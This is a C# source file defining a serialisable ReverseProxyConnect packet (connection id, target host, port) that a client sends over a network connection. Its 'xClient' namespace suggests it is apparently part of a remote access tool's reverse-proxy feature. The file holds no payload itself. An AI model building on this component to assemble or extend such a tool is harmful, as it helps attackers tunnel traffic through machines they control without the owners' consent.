using System;
using xClient.KuuhakuÇekirdek.Ağ;
using xClient.KuuhakuÇekirdek.Paketler;

namespace xClient.KuuhakuÇekirdek.ReverseProxy.Packets
{
    [Serializable]
    public class ReverseProxyConnect : IPacket
    {
        public int ConnectionId { get; set; }

        public string Target { get; set; }

        public int Port { get; set; }

        public ReverseProxyConnect()
        {
        }

        public ReverseProxyConnect(int connectionId, string target, int port)
        {
            this.ConnectionId = connectionId;
            this.Target = target;
            this.Port = port;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
